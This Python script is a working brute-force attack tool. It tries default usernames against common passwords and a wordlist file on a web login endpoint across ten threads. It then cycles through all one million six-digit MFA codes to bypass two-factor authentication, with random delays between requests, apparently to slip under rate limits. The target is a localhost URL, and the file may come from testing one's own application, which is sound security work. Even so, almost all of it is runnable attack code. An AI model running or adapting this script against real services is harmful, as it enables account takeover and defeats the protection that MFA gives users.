import requests
import time
import threading
import random
from queue import Queue
import re
import logging

base_url = 'http://127.0.0.1:8080'
usernames = ['admin', 'root', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle']
passwords = ['admin', '123456', 'password', '1234', '12345', 'qwerty', '123', 'test', '1q2w3e4r', 'user']
mfa_codes = [f'{i:06}' for i in range(1000000)]

# Improved password list considering dictionary attacks
with open("password_list.txt", "r", encoding='utf-8') as file:
    passwords += [line.strip() for line in file]

#file from git for fuzzing process

# Queue for login credentials
login_queue = Queue()
for username in usernames:
    for password in passwords:
        login_queue.put((username, password))

# Success/failure indicators
success_indicator = re.compile(r'Hello, you are logged in!')  # This needs to be tailored to your application
failure_indicator = re.compile(r'Hello Guest!')  # This needs to be tailored to your application

# Session for handling cookies, etc.
session = requests.Session()

# Setting up logging
logging.basicConfig(filename="auth_fuzz.log", level=logging.INFO)

def login_worker():
    while not login_queue.empty():
        credentials = login_queue.get()
        username, password = credentials

        payload = {'username': username, 'password': password}
        try:
            start_time = time.time()
            response = session.post(f'{base_url}/login', data=payload)
            end_time = time.time()

            if response.status_code != 200:
                logging.error(f'Non-200 response ({response.status_code}) from server with - Username: {username}, Password: {password}')

            # Look for success/failure indicators in the response
            if success_indicator.search(response.text):
                logging.info(f'Successful login with - Username: {username}, Password: {password}. Time taken: {end_time - start_time} seconds')
            elif failure_indicator.search(response.text):
                logging.info(f'Failed login with - Username: {username}, Password: {password}. Time taken: {end_time - start_time} seconds')
            else:
                logging.info(f'Unknown response with - Username: {username}, Password: {password}. Time taken: {end_time - start_time} seconds')

            time.sleep(random.uniform(0.1, 1))  # Random delay between requests
        except requests.exceptions.RequestException as e:
            logging.error(f'Error: {str(e)}. With - Username: {username}, Password: {password}')

        # Signaling that task is done
        login_queue.task_done()

def mfa_worker():
    random.shuffle(mfa_codes)  # Randomize MFA code attempts
    for code in mfa_codes:
        payload = {'mfa_code': code}
        try:
            start_time = time.time()
            response = session.post(f'{base_url}/login/mfa', data=payload)
            end_time = time.time()

            if response.status_code != 200:
                logging.error(f'Non-200 response ({response.status_code}) with MFA code: {code}')

            if success_indicator.search(response.text):
                logging.info(f'Successful MFA bypass with code: {code}. Time taken: {end_time - start_time} seconds')
                break
            else:
                logging.info(f'Failed MFA bypass with code: {code}. Time taken: {end_time - start_time} seconds')

            time.sleep(random.uniform(0.1, 1))  # Random delay between requests
        except requests.exceptions.RequestException as e:
            logging.error(f'Error: {str(e)}. With MFA code: {code}')

def rate_limit_test():
    username = random.choice(usernames)
    password = random.choice(passwords)
    start_time = time.time()

    for _ in range(50):  # Number of attempts to test
        payload = {'username': username, 'password': password}
        try:
            response = session.post(f'{base_url}/login', data=payload)
            if response.status_code != 200:
                logging.error(f'Non-200 response ({response.status_code}) from server during rate limit test')
        except requests.exceptions.RequestException as e:
            logging.error(f'Error: {str(e)} during rate limit test')

        time.sleep(random.uniform(0.1, 1))  # Random delay between requests

    end_time = time.time()
    logging.info(f'Rate limit test took {end_time - start_time} seconds for 50 requests')

# Creating worker threads
for _ in range(10):  # Adjust the number of threads as necessary
    worker_thread = threading.Thread(target=login_worker)
    worker_thread.start()

# Waiting for all tasks to complete
login_queue.join()

# Start MFA fuzzing
mfa_thread = threading.Thread(target=mfa_worker)
mfa_thread.start()
mfa_thread.join()

# Perform rate limit testing
rate_limit_test()
